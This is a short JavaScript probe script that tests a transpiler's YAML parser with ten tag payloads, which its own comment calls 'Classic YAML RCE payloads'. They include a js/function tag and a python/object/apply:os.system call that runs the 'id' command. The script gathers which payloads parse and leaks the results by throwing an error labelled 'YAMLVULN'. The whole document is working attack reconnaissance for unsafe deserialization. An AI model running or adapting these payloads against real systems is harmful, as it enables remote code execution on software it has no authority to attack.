var out = {};
function S(x,n){ try { return String(x).slice(0,n||600); } catch(e){ return "?"; } }
var t = require.transpiler;
// The yaml branch uses `i.load(e)` -- a YAML parser. Classic YAML RCE payloads:
var payloads = {
  "js/function":      'x: !!js/function "function(){ return 1 }"',
  "js/undefined":     'x: !!js/undefined',
  "js/regexp":        'x: !!js/regexp /a/',
  "js/date":          'x: !!js/date 2020-01-01',
  "python/object":    'x: !!python/object/apply:os.system ["id"]',
  "unsafe tag":       'x: !<tag:yaml.org,2002:js/function> "function(){}"',
  "map key obj":      'x: !!map {}',
  "set":              'x: !!set {a: null}',
  "binary":           'x: !!binary "' + Buffer.from("hello").toString("base64") + '"',
  "merge key":        'a: &x {y: 1}\nb: {<<: *x, z: 2}'
};
out.y = {};
Object.keys(payloads).forEach(function(k){
  try { out.y[k] = "OK " + S(t(payloads[k], "/p.yaml"), 280); } catch(e){ out.y[k] = "EXC:"+S(e,150); }
});
throw new Error("YAMLVULN::" + JSON.stringify(out.y));
